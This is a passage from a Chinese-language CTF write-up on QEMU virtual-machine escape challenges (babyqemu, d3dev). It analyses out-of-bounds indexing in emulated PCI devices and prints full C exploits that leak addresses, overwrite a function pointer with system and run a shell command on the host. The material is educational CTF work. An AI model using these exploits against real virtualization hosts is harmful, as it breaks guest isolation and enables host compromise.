class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:03.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span>(iopl(<span class="number">3</span>)!=<span class="number">0</span>)&#123;perror(<span class="string">&quot;iopl failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">   <span class="comment">//iopl函数来提升IO的等级，否则这个pmio使用的是有问题的</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    mmio_write(<span class="number">2</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">3</span>,<span class="number">0x41414141</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">0x3b414141</span>);</span><br><span class="line">    mmio_write(<span class="number">5</span>,<span class="number">0x6d6f6e67</span>);   <span class="comment">// regs[2]</span></span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">0x61632d65</span>);  <span class="comment">// regs[3]</span></span><br><span class="line">    mmio_write(<span class="number">7</span>,<span class="number">0x6c75636c</span>);  <span class="comment">// regs[4]</span></span><br><span class="line">    mmio_write(<span class="number">8</span>,<span class="number">0x726f7461</span>);  <span class="comment">// regs[5]</span></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x118</span>);<span class="comment">//set opaque-&gt;addr</span></span><br><span class="line">    <span class="type">uint64_t</span> high_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    <span class="type">uint64_t</span> low_addr=pmio_read(<span class="number">4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> rand_r_addr=low_addr+(high_addr&lt;&lt;<span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;low addr @ %llx\n&quot;</span>,low_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;high addr @ %llx\n&quot;</span>,high_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rand_r function address @ %llx\n&quot;</span>,rand_r_addr);</span><br><span class="line">    <span class="type">uint64_t</span> system_addr=rand_r_addr+<span class="number">0xb080</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system function address @ %llx\n&quot;</span>,system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0x114</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,system_addr&amp;<span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------tigger system----------------</span></span><br><span class="line">    pmio_write(<span class="number">0</span>,<span class="number">0xc</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;test\n&quot;</span>);</span><br><span class="line">    pmio_write(<span class="number">4</span>,<span class="number">0x0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303011626104.png" alt="image-20230301162602101"></p>
<h4 id="猜测"><a href="#猜测" class="headerlink" title="猜测"></a>猜测</h4><p>因为上面发现 <code>mmio_read</code> 和 <code>mmio_write</code> 函数都无法索引溢出，尽管看起来 <code>qemu-system-x86_64</code> 程序中没有做任何的检查，但尝试了一下，数组越界访问的话确实是有点问题。然后看了一个师傅的解释，大概是下面的这个意思</p>
<p><code>MMIO</code> 和 <code>PMIO</code> 的空间大小是由 <code>pci_xxx_realize</code> 函数中注册的。</p>
<p>本题这里标明了 <code>MMIO</code> 的大小是 <code>0x100</code>  </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302281045546.png" alt="image-20230228104514364"></p>
<p>本地的 <code>regs</code> 数组大小就是 <code>0x100</code> ，所以这里是无法通过数组溢出覆盖到下面的函数指针的。因为 <code>pci</code> 设备内部会进程检查</p>
<h3 id="HITB-GSEC2017-BABYQEMU"><a href="#HITB-GSEC2017-BABYQEMU" class="headerlink" title="[HITB GSEC2017]BABYQEMU"></a>[HITB GSEC2017]BABYQEMU</h3><p>附件在 <code>buu</code> 上可以搜到</p>
<p>通过分析 <code>launch.sh</code> 文件得知这次的设备叫做 <code>hitb</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#! /bin/sh</span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-initrd ./rootfs.cpio \</span><br><span class="line">-kernel ./vmlinuz-4.8.0-52-generic \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M --nographic  -L ./dependency/usr/local/share/qemu \</span><br><span class="line">-L pc-bios \</span><br><span class="line">-device hitb,id=vda</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>我用的 <code>ubuntu18.04</code> ，然后运行 <code>launch.sh</code> 的时候有如下报错</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041237815.png" alt="image-20230304123706649"></p>
<p>解决方法：执行 <code>sudo apt install libcurl3</code></p>
<p>然后发现登录上去的时候询问用户名和密码</p>
<p>我们用如下命令，来将 <code>rootfs.cpio</code> 文件解压缩，然后我们去 <code>etc</code> 目录下，查看 <code>shadow</code> 文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir tmp</span><br><span class="line">cpio -idv &lt; /home/zikh/Desktop/pwn_qemu/rootfs.cpio</span><br><span class="line">cd etc</span><br><span class="line">cat shadow</span><br></pre></td></tr></table></figure>



<p>发现如果用户名为 <code>root</code> 的话，后面的密码为空（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303021733038.png" alt="image-20230302173323824"></p>
<p>因此在登录的时候，用户名输入为 <code>root</code> 即可登录成功（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041306416.png" alt="image-20230304130630554" style="zoom:50%;" />



<h4 id="代码逆向-1"><a href="#代码逆向-1" class="headerlink" title="代码逆向"></a>代码逆向</h4><p>首先在 <code>hitb_class_init</code> 函数中确定设备号</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041308293.png" alt="image-20230304130826234" style="zoom:50%;" />

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041309270.png" alt="image-20230304130955192"></p>
<p>结合上面两个图片可以分析出 <code>00:04:0</code> 是 <code>hitb</code> 的设备号。</p>
<p>本题没有 <code>pmio</code> 的函数，但是有 <code>mmio</code> 的两个函数以及 <code>dma_timer</code> 。</p>
<p>简单分析下这三个函数</p>
<p>首先看 <code>hitb_mmio_read</code> 函数（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041321559.png" alt="image-20230304132100421"></p>
<p>这个比较明显，函数就是让你选择不同的 <code>addr</code> 然后用 <code>return</code> 返回结构体的不同字段。想显示结构体的字段的话，需要将 <code>opaque</code> 的类型改为 <code>HitbState *</code> （这是 <code>qemu</code> 逃逸的第三道题了，给我的感觉是通常漏洞都发生在数组索引越界上），这个 <code>mmio_read</code> 函数并没有用到索引来访问成员，所以这里简单看一下发现是没什么问题的。</p>
<p>其次是 <code>hitb_mmio_write</code> 函数（如下），这里就是让根据不同的 <code>addr</code> 然后给结构体不同的字段进行赋值，其值为 <code>val</code>。这里也没有通过数组的索引来访问成员，看起来也是安全的。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041325990.png" alt="image-20230304132554889" style="zoom: 67%;" />



<p>不过这里要关注一下 <code>timer_mod</code> 函数 </p>
<p>该函数的大致意思是说当超过 <code>expire_time</code> 这个时间时会触发定时器中断，其处理函数是 <code>ts</code> 结构体中的 <code>cb</code> 参数指定的函数，在 <code>pci_hitb_realize</code> 函数中的 <code>timer_init_tl</code> 函数里面将 <code>hitb_dma_timer</code> 函数赋值给了 <code>ts</code> 结构体中的 <code>cb</code> （ <code>call back</code> ）。因此我们添加 <code>sleep</code> 函数，让其超过 <code>expire_time</code> ，从而调用 <code>hitb_dma_timer</code> 函数</p>
<p>最后来看下 <code>hitb_dma_timer</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303041434536.png" alt="image-20230304143404417"></p>
<p>这里就有我们心心念念的数组索引了，而且我们能够发现这里的索引 <code>v2</code> 是没有做任何检查的，并且它是被 <code>opaque-&gt;dma.src</code> 所控制，这个 <code>dma.src</code> 是在 <code>hitb_mmio_write</code> 函数可以被我们控制的，所以这里 <code>dma_buf[v2]</code> 是存在索引溢出的。</p>
<h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><p>重点看下 <code>cpu_physical_memory_rw</code> 函数</p>
<blockquote>
<p><code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf,int len, int is_write)</code> 函数是 <code>QEMU</code> 虚拟机监视器中一个用于读写物理内存的函数。该函数的作用是在虚拟机中读写指定地址的物理内存，并将读取或写入的数据存储在给定的缓冲区中。它的参数如下：</p>
<ul>
<li><code>hwaddr addr</code>：一个表示物理内存地址的无符号整数类型。需要读写的物理地址。</li>
<li><code>uint8_t *buf</code>：一个指向要读取或写入数据的缓冲区的指针。数据存储在这里。</li>
<li><code>int len</code>：一个整数，表示要读取或写入数据的长度。</li>
<li><code>int is_write</code>：一个整数，表示操作是读取（0）还是写入（非0）操作。</li>
</ul>
</blockquote>
<p>以这行代码为例 <code>cpu_physical_memory_rw(opaque-&gt;dma.dst, cnt_low, opaque-&gt;dma.cnt, 1);</code>  ，其作用是将 <code>cnt_low</code> 写入物理内存 <code>opaque-&gt;dma.dst</code> 的位置（ <code>qemu</code> 中的物理内存 ）,写入的字节数为 <code>opaque-&gt;dma.cnt</code> 。</p>
<p><code>cnt_low</code> 是由 <code>(uint8_t *)&amp;opaque-&gt;dma_buf[v2]</code> 所赋值的，我们上面提到了 <code>dma_buf</code> 数组存在索引溢出，现在来看下比 <code>dma_buf</code> 低的位置有没有什么可用的（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820030.png" alt="image-20230304162135975" style="zoom: 50%;" />

<p>发现了 <code>dma_buf</code> 下面紧挨着的就是 <code>enc</code> 这个函数地址，因此我们可以让 <code>v2</code> 溢出，让其 <code>dma_buf[v2]</code> 指向 <code>enc</code> ，接着执行 <code>cpu_physical_memory_rw</code> 函数，这样 <code>enc</code> 函数的地址就会被写入到 <code>opaque-&gt;dma.dst</code> 指向的内存，也就是说只要让 <code>opaque-&gt;dma.dst</code> 为我们能够访问的物理内存，执行完这个函数后，我们就可以通过打印这个物理内存所对应的变量就能获取程序基地址</p>
<p>搜索一下发现，本题是有 <code>system</code> 函数的，所以只要拿到程序里函数的地址，用固定偏移就可以得到 <code>system</code> 函数的地址。</p>
<p>**注意：<code>cpu_physical_memory_rw</code> 函数的第一个参数需要的是物理地址，所以需要将 <code>qemu</code> 中的虚拟内存转换为物理地址，具体转换的方法可以参考文末的 <code>qemu</code> 中的虚拟内存与物理内存部分 ** </p>
<p>这里的 <code>exp</code> 如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint64_t</span> enc_addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line"><span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br></pre></td></tr></table></figure>

<p>这个 <code>exp</code> 先打印了我定义的 <code>enc_addr</code> 这个变量在 <code>qemu</code> 中的虚拟地址，以及在 <code>qemu</code> 中的物理地址，和变量本身的值。当执行完 <code>cpu_physical_memory_rw</code> 函数后再次打印 <code>enc_addr</code> 变量的值（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820680.png" alt="image-20230304175344273"></p>
<p>可以发现 <code>enc_value</code> 从最开始的 <code>0</code> 在 <code>cpu_physical_memory_rw</code> 函数执行后，变成了 <code>0x55835e3b3dd0</code> ，这个地址正是 <code>enc</code> 函数的地址。从而说明了 <code>cpu_physical_memory_rw</code> 函数可以将一个值写入到我们指定的物理内存中</p>
<p>如果能理解上面这个将 <code>enc</code> 函数的地址读到物理地址上的过程，那依次类推，将物理地址中的数据写回 <code>opaque-&gt;dma_buf[v2]</code> 也就很好理解了。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820582.png" alt="image-20230304201045218"></p>
<p>值得一提的是，如果用 <code>IDA</code> 来看这个 <code>v6</code> 后面的赋值会感觉十分难理解，这里反而看汇编会更容易理解。</p>
<p>汇编部分如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820277.png" alt="image-20230304201218093"></p>
<p>通过分析这四行汇编，发现上面给 <code>v6</code> 赋值的代码就是 <code>opaque-&gt;dma_buf[opaque-&gt;dma.dst-0x40000]</code> </p>
<p>所以控制 <code>dma.dst</code> 为 <code>0x41000</code> ，此时就是 <code>dma_buf[0x1000]</code> 这个位置放的就是 <code>enc</code> 函数的地址，<code>cpu_physical_memory_rw(opaque-&gt;dma.src, v6, opaque-&gt;dma.cnt, 0)</code> 函数会将 <code>opaque-&gt;dma.src</code> 中的数据读入到 <code>dma_buf[0x1000]</code> 的位置，因为 <code>dma.src</code> 是物理内存地址，所以我们将 <code>system</code> 函数的物理地址写入 <code>dma.src</code> 。</p>
<p>最后我们依然利用一次 <code>cpu_physical_memory_rw</code> 函数来往虚拟地址中写参数（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820553.png" alt="image-20230304202531687"></p>
<p>此时我们的 <code>v6</code> 要写为参数的地址，这回我们不需要数组索引溢出了，因此我选择了将参数写入到 <code>opaque-&gt;dma_buf[0]</code> 的位置，然后进入 <code>(v4 &amp; 4)!=0</code> 这个分支，去调用 <code>opaque-&gt;enc((char *)v6,cnt_low)</code>  劫持执行流，调用 <code>system(&quot;cat /flag&quot;)</code> </p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMIO_BASE 0xc050</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> * addr)</span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> page;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    lseek(fd,((<span class="type">uint64_t</span>)addr &gt;&gt; <span class="number">12</span> &lt;&lt; <span class="number">3</span>),<span class="number">0</span>);</span><br><span class="line">    read(fd,&amp;page,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> ((page &amp; <span class="number">0x7fffffffffffff</span>) &lt;&lt; <span class="number">12</span> ) | ((<span class="type">uint64_t</span>)addr &amp; <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">	perror(msg);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">unsigned</span> size)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *( (<span class="type">uint64_t</span> *)mmio_mem + addr );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem+addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000\:00/0000\:00\:04.0/resource0&quot;</span>,O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd==<span class="number">-1</span>)&#123;  perror(<span class="string">&quot;mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);  &#125;</span><br><span class="line"> </span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>,<span class="number">0x1000</span>,PROT_READ | PROT_WRITE, MAP_SHARED,mmio_fd,<span class="number">0</span>);     <span class="comment">//mmap mmio space</span></span><br><span class="line">    <span class="keyword">if</span>(mmio_mem == MAP_FAILED)&#123; perror(<span class="string">&quot;map mmio failed&quot;</span>);<span class="built_in">exit</span>(<span class="number">-1</span>);&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);</span><br><span class="line">	<span class="comment">//printf(&quot;mmio_write @ ----&gt; %p\n&quot;,mmio_write);</span></span><br><span class="line">    getchar();</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//-----------leak libc address----------</span></span><br><span class="line">    <span class="type">uint64_t</span> enc_addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_addr @ %llx\n&quot;</span>,&amp;enc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_physics_addr @ %llx\n&quot;</span>,gva_to_gpa(&amp;enc_addr));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,gva_to_gpa(&amp;enc_addr));<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">2</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enc_value @ %llx\n&quot;</span>,enc_addr);</span><br><span class="line">    <span class="type">uint64_t</span> call_system_addr=enc_addr<span class="number">-0x862b8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;system_addr @ %llx\n&quot;</span>,call_system_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//----------write system address---------</span></span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(&amp;call_system_addr));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x41000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="number">0x8</span>);<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//----------Control parameters-----------</span></span><br><span class="line">    <span class="type">char</span> *command=<span class="string">&quot;cat /flag;cat /root/flag;cat flag;pwd&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;command address is %llx&quot;</span>,command);</span><br><span class="line">    mmio_write(<span class="number">0x80</span>,gva_to_gpa(command));<span class="comment">//set dma.src</span></span><br><span class="line">    mmio_write(<span class="number">0x88</span>,<span class="number">0x40000</span>);<span class="comment">//set dma.dst</span></span><br><span class="line">    mmio_write(<span class="number">0x90</span>,<span class="built_in">strlen</span>(command));<span class="comment">//set dma.cnt</span></span><br><span class="line">    mmio_write(<span class="number">0x98</span>,<span class="number">0x1</span>|<span class="number">0x4</span>);<span class="comment">//set dma.cmd call dma_timer</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820957.png" alt="image-20230304172709467"></p>
<h3 id="d3dev"><a href="#d3dev" class="headerlink" title="d3dev"></a>d3dev</h3><h4 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h4><p>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp">https://pan.baidu.com/s/1z1-Wk30RJEmQTSsEzVtvig?pwd=t9gp</a> 提取码: t9gp </p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820851.png" alt="image-20230316145717263" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820351.png" alt="image-20230316145949280" style="zoom: 67%;" />

<p>通过观察对比 <code>class_init</code> 函数中的数据，发现 <code>d3dev</code> 设备号为 <code>00:03.0</code> </p>
<p>数组索引溢出漏洞位于 <code>d3dev_mmio_write</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161820215.png" alt="image-20230316150429029" style="zoom:50%;" />

<p>这里的 <code>v4</code> 来自于 <code>v4 = opaque-&gt;seek + (unsigned int)(addr &gt;&gt; 3);</code> </p>
<p><code>seek</code> 和 <code>addr</code> 都可控，也就意味着 <code>v4</code> 可控。这样我们就可以通过索引溢出来控制 <code>rand_r</code> 函数指针（如下），在 <code>d3dev_pmio_write</code> 函数中，调用了 <code>rand_r</code> 函数，如果将 <code>rand_r</code> 改成 <code>system</code> 函数，则可以触发后门。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821297.png" alt="image-20230316151852507"></p>
<p>需要注意的是如果使用 <code>seek</code> 默认为 <code>0</code> ，那么<code>addr</code> 需要为 <code>0x818</code> 。但是 <code>MMIO</code> 区域为 <code>0x800</code> ，因此使用 <code>0x818</code> 的话 <code>PCI</code> 设备在内部会检查到这里发生了越界（如下）。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821884.png" alt="image-20230316152939181" style="zoom:50%;" />



<p>所以这里还需要控制 <code>seek</code> 为 <code>0x100</code> ，控制 <code>addr</code> 为 <code>0x18</code> , 才能让 <code>blocks[v4]</code> 正好落在 <code>rand_r</code> 的位置。</p>
<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>因为本题开了 <code>PIE</code> ，即使程序中给了 <code>system</code> 函数，依然需要泄露程序的基地址。</p>
<p>泄露地址这里涉及一个 <code>tea</code> 加解密</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161821914.png" alt="image-20230316153307989"></p>
<p>这里是可以越界读取 <code>rand_r</code> 的地址，但是读取的结果会放到 <code>v5</code> ，经过了 <code>tea</code> 加密后，最终 <code>return</code> 将其返回，此处的 <code>key[0] key[1] key[2] key[3]</code> 在 <code>d3dev_pmio_write</code> 函数中都可以被设置为 <code>0</code> （如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303161819077.png" alt="image-20230316154127664" style="zoom:50%;" />

<p>因此最后的解密脚本应该如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">decode</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>])</span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        i -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v[<span class="number">0</span>] += ((v[<span class="number">1</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">1</span>]+i)^((v[<span class="number">1</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">        v[<span class="number">1</span>] += ((v[<span class="number">0</span>]&lt;&lt;<span class="number">4</span>))^(v[<span class="number">0</span>]+i)^((v[<span class="number">0</span>]&gt;&gt;<span class="number">5</span>));</span><br><span class="line">    &#125; <span class="keyword">while</span>(i!=<span class="number">0xC6EF3720</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样将接收到的密文用这个函数解密，即可得到 <code>rand_r</code> 函数的地址。</p>
<p>用 <code>mmio_write</code> 函数写入 <code>system</code> 地址的时候，需要先加密后写入，不然只能写入四个字节。</p>
